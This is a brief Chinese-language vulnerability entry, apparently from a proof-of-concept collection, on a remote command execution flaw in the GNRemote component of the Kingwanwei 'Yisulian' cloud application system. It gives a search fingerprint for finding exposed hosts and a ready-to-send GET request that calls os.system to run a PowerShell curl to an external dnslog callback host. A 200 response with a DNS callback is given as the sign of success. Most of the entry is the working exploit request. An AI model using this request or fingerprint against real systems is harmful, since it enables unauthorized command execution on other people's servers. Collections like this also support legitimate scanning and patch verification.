# 金万维异速联云联应用系统GNRemote存在远程命令执行漏洞

金万维异速联云联应用系统 ｜ 命令执行 ｜ —
- **指纹**：`body="GNRemote.dll"`
- **请求**：`GET /GNRemote.dll?GNFunction=CallPython&pyFile=os&pyFunc=system&pyArgu=powershell+curl+xxx.dnslog.cn HTTP/1.1`
- **响应特征**：200 dnslog回显